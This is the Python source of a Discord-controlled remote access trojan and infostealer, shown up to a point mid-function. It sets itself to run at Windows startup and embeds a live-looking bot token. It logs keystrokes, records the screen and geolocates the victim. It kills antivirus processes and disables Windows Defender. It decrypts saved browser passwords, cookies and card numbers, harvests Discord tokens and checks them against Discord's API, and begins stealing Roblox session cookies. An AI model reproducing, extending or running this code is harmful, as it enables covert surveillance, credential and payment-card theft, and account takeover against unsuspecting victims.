import discord
import discord.ui
from discord.ext import commands
import psutil
from io import BytesIO
import io
import pyautogui
import cv2
import numpy as np
import threading
from pathlib import Path
import os
import ctypes
import win32api
import win32con
import winreg
import platform
import subprocess
from pynput import keyboard
import sqlite3
import json
import base64
import shutil
import tempfile
from datetime import datetime
import re
import urllib.request
import urllib.parse
import webbrowser
import sys
import time
import socket
import uuid
import asyncio
import traceback
import logging

# Error logging setup
def setup_error_logging():
    """Setup error logging to file"""
    try:
        log_file = os.path.join(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__), 'kane_error.log')
        logging.basicConfig(
            filename=log_file,
            level=logging.ERROR,
            format='%(asctime)s - %(levelname)s - %(message)s',
            filemode='a'
        )
        return logging.getLogger(__name__)
    except:
        return None

logger = setup_error_logging()

# Hide console window on Windows (only if not frozen/exe)
# Keep console visible for debugging - uncomment to hide after testing
# if platform.system() == 'Windows' and not getattr(sys, 'frozen', False):
#     try:
#         # Hide the console window
#         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
#     except:
#         pass

def add_to_startup():
    """Add the script to Windows startup"""
    try:
        # Get the current script path
        script_path = os.path.abspath(sys.argv[0])
        
        # Get Python executable path (use pythonw.exe if available for no console)
        python_exe = sys.executable
        if 'python.exe' in python_exe.lower():
            # Try to use pythonw.exe instead
            pythonw_exe = python_exe.replace('python.exe', 'pythonw.exe')
            if os.path.exists(pythonw_exe):
                python_exe = pythonw_exe
        
        # Create the command to run
        startup_cmd = f'"{python_exe}" "{script_path}"'
        
        # Add to Windows startup registry
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "DiscordBot"  # You can change this name
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, startup_cmd)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            # If it fails, try creating the key first
            try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, startup_cmd)
                winreg.CloseKey(key)
                return True
            except:
                return False
    except Exception as e:
        return False

# Automatically add to startup when script runs
if platform.system() == 'Windows':
    add_to_startup()

TOKEN = "MTQzNjg0MTQ3NzEzNjE5MTY0MA.GLQJdu.-cFK-CRRuRt71A4rw91svo5L1o1rT4oYbF0jn0" # 
GUILD_ID = "1440143546127749200" # 
CHANNEL_ID = "1440143546127749203" # 
VOICE_CHANNEL_ID = 1440143546593054953  # General call

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Voice client storage
voice_client = None
screensharing = False
screenshare_task = None

# Audio sink to receive microphone audio
try:
    from discord.sinks import WaveSink
    
    class AudioSink(WaveSink):
        def __init__(self, destination):
            super().__init__(destination)
            self.audio_data = []
        
        def write(self, user, audio):
            # Store audio data
            self.audio_data.append({
                'user': user,
                'audio': audio,
                'timestamp': datetime.now()
            })
            # Also write to file
            super().write(user, audio)
        
        def cleanup(self):
            super().cleanup()
except ImportError:
    # Fallback for older discord.py versions
    class AudioSink:
        def __init__(self, destination):
            self.destination = destination
            self.audio_data = []
        
        def write(self, user, audio):
            self.audio_data.append({
                'user': user,
                'audio': audio,
                'timestamp': datetime.now()
            })
            # Write audio to file
            try:
                with open(self.destination, 'ab') as f:
                    f.write(audio)
            except:
                pass
        
        def cleanup(self):
            pass

def get_pc_info():
    # Get IP address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "N/A"
    
    # Get public IP
    try:
        public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
    except:
        public_ip = "N/A"
    
    # Get location (approximate from IP)
    location = "N/A"
    try:
        location_data = urllib.request.urlopen(f'http://ip-api.com/json/{public_ip}').read().decode('utf8')
        location_json = json.loads(location_data)
        if location_json.get('status') == 'success':
            location = f"{location_json.get('city', 'N/A')}, {location_json.get('regionName', 'N/A')}, {location_json.get('country', 'N/A')}"
    except:
        pass
    
    # Get disk information
    disk_info = []
    try:
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disk_info.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'fstype': partition.fstype,
                    'total': usage.total / (1024**3),  # GB
                    'used': usage.used / (1024**3),    # GB
                    'free': usage.free / (1024**3),    # GB
                    'percent': usage.percent
                })
            except:
                pass
    except:
        pass
    
    # Get screen resolution
    try:
        screen_width, screen_height = pyautogui.size()
        screen_info = f"{screen_width}x{screen_height}"
    except:
        screen_info = "N/A"
    
    # Get MAC address
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except:
        mac = "N/A"
    
    return {
        "user": os.getenv('USERNAME', 'N/A'),
        "computer_name": os.getenv('COMPUTERNAME', platform.node()),
        "os_name": platform.system(),
        "os_version": platform.release(),
        "os_version_full": platform.version(),
        "processor": platform.processor(),
        "cores_physical": psutil.cpu_count(logical=False),
        "cores_logical": psutil.cpu_count(logical=True),
        "ram_total": psutil.virtual_memory().total / (1024**3),  # GB
        "ram_available": psutil.virtual_memory().available / (1024**3),  # GB
        "ram_used": psutil.virtual_memory().used / (1024**3),  # GB
        "ram_percent": psutil.virtual_memory().percent,
        "local_ip": local_ip,
        "public_ip": public_ip,
        "location": location,
        "mac_address": mac,
        "screen_resolution": screen_info,
        "disk_info": disk_info,
        "cpu_percent": psutil.cpu_percent(interval=1),
        "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    }

recording = False
keylogging = False
keylog_buffer = []
keylogger_listener = None

def record_screen():
    global recording
    size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter("output.avi", fourcc, 12.0, (size[0], size[1]))
    while recording:
        try:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(1/12.0)  # Wait for next frame (12 FPS)
        except Exception as e:
            pass
    out.release()
    return "output.avi"

def on_press(key):
    global keylog_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            keylog_buffer.append(key.char)
        else:
            key_name = str(key).replace('Key.', '')
            keylog_buffer.append(f'[{key_name}]')
    except Exception as e:
        pass

def start_keylogger():
    global keylogger_listener, keylogging
    if not keylogging:
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        keylogging = True

def stop_keylogger():
    global keylogger_listener, keylogging
    if keylogging and keylogger_listener:
        keylogger_listener.stop()
        keylogging = False

def disable_antivirus():
    results = []
    
    # Common antivirus process names and services
    av_processes = [
        "MsMpEng", "NisSrv", "SecurityHealthService", "MsSecFwd",  # Windows Defender
        "avguard", "avgnt", "avgsvca", "avgemc",  # Avira
        "avgcsrvx", "avgidsagent", "avgwdsvcx", "avgsvca",  # AVG
        "avastsvc", "avastui", "aswidsagenta",  # Avast
        "ekrn", "egui",  # ESET
        "mbamtray", "mbamservice",  # Malwarebytes
        "bdagent", "vsserv",  # Bitdefender
        "kavsvc", "avp",  # Kaspersky
        "mcshield", "vstskmgr",  # McAfee
        "rtvscan", "ccsvchst",  # Norton
        "sophos", "savservice",  # Sophos
        "fsguiexe", "fshoster32",  # F-Secure
        "pccntmon", "pccntupdmgr",  # PC Tools
    ]
    
    av_services = [
        "WinDefend", "WdNisSvc", "SecurityHealthService",  # Windows Defender
        "Antivirus", "AVGIDSAgent", "AVG WatchDog",  # AVG
        "avast! Antivirus", "AvastVBox COM Service",  # Avast
        "ekrn", "ESET Service",  # ESET
        "MBAMService", "MBAMChameleon",  # Malwarebytes
        "VSSERV", "BDVEDISK",  # Bitdefender
        "AVP", "Kaspersky",  # Kaspersky
        "McAfee", "McShield",  # McAfee
        "Norton", "NIS",  # Norton
        "Sophos", "SAVService",  # Sophos
    ]
    
    # Kill antivirus processes
    for proc_name in av_processes:
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc_name.lower() in proc.info['name'].lower():
                    proc.terminate()
                    results.append(f"Killed process: {proc.info['name']}")
        except:
            pass
    
    # Stop antivirus services
    for service_name in av_services:
        try:
            subprocess.run(f'net stop "{service_name}" /y', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
            results.append(f"Stopped service: {service_name}")
        except:
            pass
    
    # Disable Windows Defender via registry
    try:
        key_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"),
        ]
        
        for hkey, path in key_paths:
            try:
                key = winreg.CreateKey(hkey, path)
                winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(key, "DisableScanOnRealtimeEnable", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                results.append(f"Disabled Windows Defender via registry: {path}")
            except:
                pass
    except:
        pass
    
    # Disable Windows Defender via PowerShell
    try:
        ps_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -DisableRemovableDriveScanning $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisablePrivacyMode $true',
            'Set-MpPreference -DisableArchiveScanning $true',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableNetworkProtection $true',
        ]
        
        for cmd in ps_commands:
            try:
                subprocess.run(f'powershell -Command "{cmd}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
                results.append(f"PowerShell: {cmd}")
            except:
                pass
    except:
        pass
    
    # Attempt to uninstall common antiviruses via WMI
    try:
        uninstall_commands = [
            'wmic product where "name like \'%Windows Defender%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%Avira%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%AVG%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%Avast%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%ESET%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%Malwarebytes%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%Bitdefender%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%Kaspersky%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%McAfee%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%Norton%\'" call uninstall /nointeractive',
            'wmic product where "name like \'%Sophos%\'" call uninstall /nointeractive',
        ]
        
        for cmd in uninstall_commands:
            try:
                result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
                if "ReturnValue = 0" in result.stdout.decode():
                    results.append(f"Uninstalled: {cmd}")
            except:
                pass
    except:
        pass
    
    return results

def get_chrome_key():
    """Get Chrome encryption key from Windows DPAPI"""
    try:
        try:
            import win32crypt
        except ImportError:
            return None
        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                        r'Google\Chrome\User Data\Local State')
        if os.path.exists(local_state_path):
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
    except:
        pass
    return None

def decrypt_password(password, key=None):
    """Decrypt Chrome password"""
    try:
        if isinstance(password, bytes):
            if password.startswith(b'v10') or password.startswith(b'v11'):
                # AES-256-GCM encryption (Chrome 80+)
                if key is None:
                    key = get_chrome_key()
                if key:
                    try:
                        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                        nonce = password[3:15]
                        ciphertext = password[15:]
                        aesgcm = AESGCM(key)
                        decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                        return decrypted.decode('utf-8')
                    except ImportError:
                        return "Decryption requires cryptography library"
            else:
                # DPAPI encryption (older Chrome)
                try:
                    import win32crypt
                    password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                    return password.decode('utf-8')
                except ImportError:
                    return "Decryption requires pywin32"
        else:
            # Try DPAPI for string passwords
            try:
                import win32crypt
                password_bytes = password.encode('utf-8') if isinstance(password, str) else password
                password = win32crypt.CryptUnprotectData(password_bytes, None, None, None, 0)[1]
                return password.decode('utf-8')
            except:
                return "Decryption failed"
    except:
        pass
    return "Decryption failed"

def steal_chrome_data():
    """Steal data from Chrome-based browsers"""
    browsers = {
        'Chrome': os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default'),
        'Edge': os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default'),
        'Opera': os.path.join(os.environ['APPDATA'], r'Opera Software\Opera Stable'),
        'Opera GX': os.path.join(os.environ['LOCALAPPDATA'], r'Opera Software\Opera GX\User Data\Default'),
        'Brave': os.path.join(os.environ['LOCALAPPDATA'], r'BraveSoftware\Brave-Browser\User Data\Default'),
    }
    
    all_data = {}
    
    for browser_name, browser_path in browsers.items():
        if not os.path.exists(browser_path):
            continue
            
        browser_data = {
            'passwords': [],
            'history': [],
            'cookies': [],
            'downloads': [],
            'cards': []
        }
        
        try:
            # Copy database files to temp location (they're locked when browser is open)
            temp_dir = tempfile.mkdtemp()
            
            # Passwords
            login_db = os.path.join(browser_path, 'Login Data')
            if os.path.exists(login_db):
                try:
                    temp_login = os.path.join(temp_dir, 'login.db')
                    # Try to copy the database (might be locked if browser is open)
                    try:
                        shutil.copy2(login_db, temp_login)
                    except (PermissionError, IOError):
                        # Database locked, skip this browser
                        continue
                    
                    # Get encryption key for this browser
                    browser_key = get_chrome_key()
                    
                    conn = sqlite3.connect(temp_login)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        try:
                            pwd_value = row[2]
                            password = ""
                            
                            if pwd_value:
                                if isinstance(pwd_value, bytes):
                                    # Try decryption with browser key
                                    password = decrypt_password(pwd_value, browser_key)
                                    
                                    # If decryption failed, try without key (DPAPI)
                                    if password == "Decryption failed" or password == "Decryption requires cryptography library":
                                        try:
                                            import win32crypt
                                            password = win32crypt.CryptUnprotectData(pwd_value, None, None, None, 0)[1]
                                            if isinstance(password, bytes):
                                                password = password.decode('utf-8', errors='ignore')
                                        except:
                                            password = ""
                                else:
                                    password = str(pwd_value) if pwd_value else ""
                            
                            # Only add if we got a valid password
                            if password and password not in ["Decryption failed", "Decryption requires cryptography library", "Decryption requires pywin32"]:
                                browser_data['passwords'].append({
                                    'url': row[0] or "",
                                    'username': row[1] or "",
                                    'password': password
                                })
                        except Exception as e:
                            pass
                    conn.close()
                    try:
                        os.remove(temp_login)
                    except:
                        pass
                except Exception as e:
                    pass
            
            # History
            history_db = os.path.join(browser_path, 'History')
            if os.path.exists(history_db):
                try:
                    temp_history = os.path.join(temp_dir, 'history.db')
                    shutil.copy2(history_db, temp_history)
                    conn = sqlite3.connect(temp_history)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
                    for row in cursor.fetchall():
                        browser_data['history'].append({
                            'url': row[0],
                            'title': row[1],
                            'visits': row[2],
                            'last_visit': row[3]
                        })
                    conn.close()
                    os.remove(temp_history)
                except:
                    pass
            
            # Cookies
            cookies_db = os.path.join(browser_path, 'Cookies')
            if os.path.exists(cookies_db):
                try:
                    temp_cookies = os.path.join(temp_dir, 'cookies.db')
                    shutil.copy2(cookies_db, temp_cookies)
                    conn = sqlite3.connect(temp_cookies)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies LIMIT 500")
                    for row in cursor.fetchall():
                        try:
                            if row[3]:
                                enc_value = row[3]
                                if isinstance(enc_value, bytes):
                                    value = decrypt_password(enc_value)
                                else:
                                    value = decrypt_password(enc_value)
                            else:
                                value = row[2] or ""
                            browser_data['cookies'].append({
                                'domain': row[0] or "",
                                'name': row[1] or "",
                                'value': value
                            })
                        except:
                            pass
                    conn.close()
                    os.remove(temp_cookies)
                except:
                    pass
            
            # Downloads
            if os.path.exists(history_db):
                try:
                    temp_history = os.path.join(temp_dir, 'history_dl.db')
                    shutil.copy2(history_db, temp_history)
                    conn = sqlite3.connect(temp_history)
                    cursor = conn.cursor()
                    cursor.execute("SELECT target_path, tab_url, total_bytes, start_time FROM downloads")
                    for row in cursor.fetchall():
                        browser_data['downloads'].append({
                            'path': row[0],
                            'url': row[1],
                            'size': row[2],
                            'time': row[3]
                        })
                    conn.close()
                    os.remove(temp_history)
                except:
                    pass
            
            # Credit Cards
            web_data = os.path.join(browser_path, 'Web Data')
            if os.path.exists(web_data):
                try:
                    temp_web = os.path.join(temp_dir, 'webdata.db')
                    shutil.copy2(web_data, temp_web)
                    conn = sqlite3.connect(temp_web)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for row in cursor.fetchall():
                        try:
                            card_enc = row[3]
                            if card_enc:
                                if isinstance(card_enc, bytes):
                                    card_number = decrypt_password(card_enc)
                                else:
                                    card_number = decrypt_password(card_enc)
                            else:
                                card_number = ""
                            browser_data['cards'].append({
                                'name': row[0] or "",
                                'month': row[1] or "",
                                'year': row[2] or "",
                                'number': card_number
                            })
                        except:
                            pass
                    conn.close()
                    os.remove(temp_web)
                except:
                    pass
            
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            pass
        
        if any(browser_data.values()):
            all_data[browser_name] = browser_data
    
    return all_data

def steal_firefox_data():
    """Steal data from Firefox"""
    firefox_path = os.path.join(os.environ['APPDATA'], r'Mozilla\Firefox\Profiles')
    if not os.path.exists(firefox_path):
        return {}
    
    firefox_data = {
        'passwords': [],
        'history': [],
        'cookies': [],
        'downloads': []
    }
    
    try:
        # Find default profile
        profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d)) and '.default' in d]
        if not profiles:
            return {}
        
        profile_path = os.path.join(firefox_path, profiles[0])
        
        # Passwords
        logins_json = os.path.join(profile_path, 'logins.json')
        key_db = os.path.join(profile_path, 'key4.db')
        if os.path.exists(logins_json):
            try:
                with open(logins_json, 'r', encoding='utf-8') as f:
                    logins = json.load(f)
                for login in logins.get('logins', []):
                    firefox_data['passwords'].append({
                        'url': login.get('hostname', ''),
                        'username': login.get('username', ''),
                        'password': 'Encrypted (requires key4.db)'
                    })
            except:
                pass
        
        # History
        places_db = os.path.join(profile_path, 'places.sqlite')
        if os.path.exists(places_db):
            try:
                temp_places = os.path.join(tempfile.gettempdir(), 'places_firefox.db')
                shutil.copy2(places_db, temp_places)
                conn = sqlite3.connect(temp_places)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000")
                for row in cursor.fetchall():
                    firefox_data['history'].append({
                        'url': row[0],
                        'title': row[1],
                        'visits': row[2],
                        'last_visit': row[3]
                    })
                conn.close()
                os.remove(temp_places)
            except:
                pass
        
        # Cookies
        cookies_db = os.path.join(profile_path, 'cookies.sqlite')
        if os.path.exists(cookies_db):
            try:
                temp_cookies = os.path.join(tempfile.gettempdir(), 'cookies_firefox.db')
                shutil.copy2(cookies_db, temp_cookies)
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 500")
                for row in cursor.fetchall():
                    firefox_data['cookies'].append({
                        'domain': row[0],
                        'name': row[1],
                        'value': row[2]
                    })
                conn.close()
                os.remove(temp_cookies)
            except:
                pass
        
        # Downloads (from places.sqlite)
        if os.path.exists(places_db):
            try:
                temp_places = os.path.join(tempfile.gettempdir(), 'places_dl_firefox.db')
                shutil.copy2(places_db, temp_places)
                conn = sqlite3.connect(temp_places)
                cursor = conn.cursor()
                cursor.execute("SELECT url, content FROM moz_places WHERE url LIKE 'file:///%'")
                for row in cursor.fetchall():
                    firefox_data['downloads'].append({
                        'url': row[0],
                        'content': row[1]
                    })
                conn.close()
                os.remove(temp_places)
            except:
                pass
        
    except:
        pass
    
    return {'Firefox': firefox_data} if any(firefox_data.values()) else {}

def steal_browser_data():
    """Steal data from all browsers"""
    all_data = {}
    
    # Chrome-based browsers
    chrome_data = steal_chrome_data()
    all_data.update(chrome_data)
    
    # Firefox
    firefox_data = steal_firefox_data()
    all_data.update(firefox_data)
    
    return all_data

def get_discord_token_info(token):
    """Get Discord user information from token"""
    try:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        req = urllib.request.Request('https://discord.com/api/v9/users/@me', headers=headers)
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode())
            return {
                'id': data.get('id', 'N/A'),
                'username': data.get('username', 'N/A'),
                'discriminator': data.get('discriminator', 'N/A'),
                'email': data.get('email', 'N/A'),
                'phone': data.get('phone', 'N/A'),
                'verified': data.get('verified', False),
                'mfa_enabled': data.get('mfa_enabled', False),
                'avatar': data.get('avatar', 'N/A'),
                'banner': data.get('banner', 'N/A'),
                'bio': data.get('bio', 'N/A'),
                'locale': data.get('locale', 'N/A'),
                'premium_type': data.get('premium_type', 0),
                'public_flags': data.get('public_flags', 0)
            }
    except:
        return None

def steal_discord_tokens():
    """Steal Discord tokens from browsers and Discord app"""
    tokens = []
    token_pattern = r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
    
    # Browser paths to check
    browser_paths = {
        'Chrome': os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Local Storage\leveldb'),
        'Edge': os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default\Local Storage\leveldb'),
        'Opera': os.path.join(os.environ['APPDATA'], r'Opera Software\Opera Stable\Local Storage\leveldb'),
        'Opera GX': os.path.join(os.environ['LOCALAPPDATA'], r'Opera Software\Opera GX\User Data\Default\Local Storage\leveldb'),
        'Brave': os.path.join(os.environ['LOCALAPPDATA'], r'BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb'),
    }
    
    # Search in browser Local Storage
    for browser_name, storage_path in browser_paths.items():
        if not os.path.exists(storage_path):
            continue
        
        try:
            # Search for tokens in leveldb files
            for file in os.listdir(storage_path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    file_path = os.path.join(storage_path, file)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read()
                            # Look for Discord token pattern
                            matches = re.findall(token_pattern.encode(), content)
                            for match in matches:
                                try:
                                    token = match.decode('utf-8', errors='ignore')
                                    if len(token) > 50 and token not in [t['token'] for t in tokens]:
                                        tokens.append({
                                            'source': browser_name,
                                            'token': token,
                                            'info': None
                                        })
                                except:
                                    pass
                    except:
                        pass
        except:
            pass
    
    # Search in Discord app storage
    discord_paths = [
        (os.path.join(os.environ['APPDATA'], r'discord\Local Storage\leveldb'), 'Discord'),
        (os.path.join(os.environ['LOCALAPPDATA'], r'Discord\Local Storage\leveldb'), 'Discord'),
        (os.path.join(os.environ['APPDATA'], r'discordcanary\Local Storage\leveldb'), 'Discord Canary'),
        (os.path.join(os.environ['APPDATA'], r'discordptb\Local Storage\leveldb'), 'Discord PTB'),
    ]
    
    for discord_path, app_name in discord_paths:
        if not os.path.exists(discord_path):
            continue
        
        try:
            for file in os.listdir(discord_path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    file_path = os.path.join(discord_path, file)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read()
                            matches = re.findall(token_pattern.encode(), content)
                            for match in matches:
                                try:
                                    token = match.decode('utf-8', errors='ignore')
                                    if len(token) > 50 and token not in [t['token'] for t in tokens]:
                                        tokens.append({
                                            'source': app_name,
                                            'token': token,
                                            'info': None
                                        })
                                except:
                                    pass
                    except:
                        pass
        except:
            pass
    
    # Also check Local Storage SQLite databases
    browser_db_paths = {
        'Chrome': os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Local Storage\leveldb'),
        'Edge': os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default'),
        'Opera': os.path.join(os.environ['APPDATA'], r'Opera Software\Opera Stable'),
        'Opera GX': os.path.join(os.environ['LOCALAPPDATA'], r'Opera Software\Opera GX\User Data\Default'),
        'Brave': os.path.join(os.environ['LOCALAPPDATA'], r'BraveSoftware\Brave-Browser\User Data\Default'),
    }
    
    for browser_name, db_path in browser_db_paths.items():
        if not os.path.exists(db_path):
            continue
        
        # Try to find Local Storage database
        try:
            for item in os.listdir(db_path):
                if 'Local Storage' in item or 'localstorage' in item.lower():
                    local_storage_path = os.path.join(db_path, item)
                    if os.path.isdir(local_storage_path):
                        leveldb_path = os.path.join(local_storage_path, 'leveldb')
                        if os.path.exists(leveldb_path):
                            for file in os.listdir(leveldb_path):
                                if file.endswith('.ldb') or file.endswith('.log'):
                                    file_path = os.path.join(leveldb_path, file)
                                    try:
                                        with open(file_path, 'rb') as f:
                                            content = f.read()
                                            matches = re.findall(token_pattern.encode(), content)
                                            for match in matches:
                                                try:
                                                    token = match.decode('utf-8', errors='ignore')
                                                    if len(token) > 50 and token not in [t['token'] for t in tokens]:
                                                        tokens.append({
                                                            'source': browser_name,
                                                            'token': token,
                                                            'info': None
                                                        })
                                                except:
                                                    pass
                                    except:
                                        pass
        except:
            pass
    
    # Get user info for each token
    for token_data in tokens:
        try:
            info = get_discord_token_info(token_data['token'])
            token_data['info'] = info
        except:
            pass
    
    return tokens

def get_roblox_user_info(cookie):
    """Get Roblox user information from cookie"""
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        req = urllib.request.Request('https://users.roblox.com/v1/users/authenticated', headers=headers)
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode())
            user_id = data.get('id', 'N/A')
            
            # Get additional user info
            try:
                req2 = urllib.request.Request(f'https://users.roblox.com/v1/users/{user_id}', headers=headers)
                with urllib.request.urlopen(req2, timeout=10) as response2:
                    user_data = json.loads(response2.read().decode())
                    return {
                        'id': user_id,
                        'username': user_data.get('name', 'N/A'),
                        'display_name': user_data.get('displayName', 'N/A'),
                        'description': user_data.get('description', 'N/A'),
                        'created': user_data.get('created', 'N/A'),
                        'is_banned': user_data.get('isBanned', False),
                        'has_verified_badge': user_data.get('hasVerifiedBadge', False)
                    }
            except:
                return {
                    'id': user_id,
                    'username': data.get('name', 'N/A'),
                    'display_name': data.get('displayName', 'N/A'),
                    'description': 'N/A',
                    'created': 'N/A',
                    'is_banned': False,
                    'has_verified_badge': False
                }
    except:
        return None

def steal_roblox_cookies():
    """Steal Roblox cookies from browsers"""
    cookies = []
    
    # Browser paths
    browser_paths = {
        'Chrome': os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default'),
        'Edge': os.path.join(os.environ['LOCALAPPDATA'], r'Microsoft\Edge\User Data\Default'),
        'Opera': os.path.join(os.environ['APPDATA'], r'Opera Software\Opera Stable'),
        'Opera GX': os.path.join(os.environ['LOCALAPPDATA'], r'Opera Software\Opera GX\User Data\Default'),
        'Brave': os.path.join(os.environ['LOCALAPPDATA'], r'BraveSoftware\Brave-Browser\User Data\Default'),
    }
    
    for browser_name, browser_path in browser_paths.items():
        if not os.path.exists(browser_path):
            continue
        
        cookies_db = os.path.join(browser_path, 'Cookies')
        if not os.path.exists(cookies_db):
            continue
        
        temp_dir = None
        try:
            # Copy database to temp location (browser might have it locked)
            temp_dir = tempfile.mkdtemp()
            temp_cookies = os.path.join(temp_dir, 'cookies.db')
            
            # Try to copy the database file
            try:
                shutil.copy2(cookies_db, temp_cookies)
            except (PermissionError, IOError) as e:
                # Database might be locked, skip this browser
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir, ignore_errors=True)
                continue
            
            # Connect to the copied database
            conn = None
            try:
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                
                # Search for .ROBLOSECURITY cookie (try multiple queries)
                queries = [
                    "SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies WHERE host_key LIKE '%roblox%' AND name = '.ROBLOSECURITY'",
                    "SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies WHERE name = '.ROBLOSECURITY'",
                    "SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies WHERE host_key LIKE '%roblox.com%'"
                ]
                
                rows_found = False
                for query in queries:
                    try:
                        cursor.execute(query)
                        rows = cursor.fetchall()
                        if rows:
                            rows_found = True
                            break
                    except:
                        continue
                
                if not rows_found:
                    conn.close()
                    if temp_dir and os.path.exists(temp_dir):
                        shutil.rmtree(temp_dir, ignore_errors=True)
                    continue
                
                for row in rows:
                    try:
                        cookie_value = None
                        
